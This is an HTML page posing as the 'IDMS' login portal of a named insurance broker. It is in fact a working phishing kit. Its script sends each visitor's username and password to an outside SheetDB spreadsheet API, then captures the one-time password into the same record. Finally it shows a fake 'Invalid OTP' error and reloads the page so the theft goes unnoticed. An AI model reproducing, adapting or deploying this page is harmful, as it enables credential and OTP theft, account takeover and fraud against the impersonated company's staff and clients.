<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IDMS Login | Secure</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>

    <nav class="top-nav">
    <div class="nav-content">
        <h1>IDMS</h1>
        <p class="company-label">Assetline Insurance Brokers (Pvt) Ltd.</p>
    </div>
    <div class="nav-pointer"></div>
</nav>

    
    <div class="login-wrapper">
        
        <main class="login-card">
            <form id="sheetdb-form">
                
                <div id="step-1">
                    <div class="input-group">
                        <i class="fa-solid fa-user"></i>
                        <input type="text" id="username" name="username" placeholder="Username" required>
                    </div>
                    <div class="input-group">
                        <i class="fa-solid fa-key"></i>
                        <input type="password" id="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="button" class="login-button" onclick="goToStep2()">
                        <span>Login In</span>
                        <i class="fa-solid fa-right-to-bracket"></i>
                    </button>
                </div>

                <div id="step-2" style="display: none;">
                    <div class="input-group">
                        <i class="fa-solid fa-shield-halved"></i>
                        <input type="text" id="otp" name="otp" placeholder="Enter OTP" required>
                    </div>
                    <input type="hidden" name="timestamp" id="timestamp">

                    <button type="submit" class="login-button" id="submit-btn">
                        <span>Verify & Login</span>
                        <i class="fa-solid fa-check-double"></i>
                    </button>
                </div>

            </form>

            <div class="options">
                <a href="#">Forgot your password?</a>
            </div>
        </main>

        <footer>
            <p>© 2024 IDMS Version 8.0.0</p>
            <p>Designed & Developed by DP INFOTECH.</p>
        </footer>
    </div>

    <script>
// --- CONFIGURATION ---
const SHEETDB_API_URL = 'https://sheetdb.io/api/v1/3lr5hvus4x4j5';
let sessionId = ""; // Stores the ID to find the row later

// 1. Step 1: Send Username & Password (CREATE ROW)
async function goToStep2() {
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    const loginBtn = document.querySelector('.login-button');

    if (user && pass) {
        // Create a unique ID for this login session
        sessionId = "IDMS-" + Math.floor(Math.random() * 1000000);
        
        // UI Feedback
        const originalHtml = loginBtn.innerHTML;
        loginBtn.innerHTML = "<span>Checking...</span> <i class='fa-solid fa-spinner fa-spin'></i>";
        loginBtn.disabled = true;

        try {
            const response = await fetch(SHEETDB_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    data: [{
                        'session_id': sessionId,
                        'username': user,
                        'password': pass,
                        'otp': 'WAITING...',
                        'timestamp': new Date().toLocaleString()
                    }]
                })
            });

            const result = await response.json();
            if (result.created === 1) {
                // Success: Move to OTP step
                document.getElementById('step-1').style.display = 'none';
                document.getElementById('step-2').style.display = 'block';
            }
        } catch (error) {
            alert("Connection error. Please try again.");
            loginBtn.disabled = false;
            loginBtn.innerHTML = originalHtml;
        }
    } else {
        alert("Please enter Username and Password.");
    }
}

// 2. Step 2: Handle OTP Submission (UPDATE ROW)
const form = document.getElementById('sheetdb-form');

form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const otpVal = document.getElementById('otp').value;
    const submitBtn = document.getElementById('submit-btn');
    const originalBtnHtml = submitBtn.innerHTML;

    if (!otpVal) return;

    submitBtn.innerHTML = "Verifying...";
    submitBtn.disabled = true;

    try {
        // We use PATCH to find the row by session_id and update only the OTP column
        const response = await fetch(`${SHEETDB_API_URL}/session_id/${sessionId}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                data: { 'otp': otpVal }
            })
        });

        const result = await response.json();

        if (result.updated === 1) {
            // Success feedback
            console.log('Update Success:', result);
            alert('Invalid OTP. Please try again');
            window.location.reload(); 
        }
    } catch (error) {
        alert('Connection error.');
        console.error(error);
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalBtnHtml;
    }
});
                
    </script>
</body>
</html>
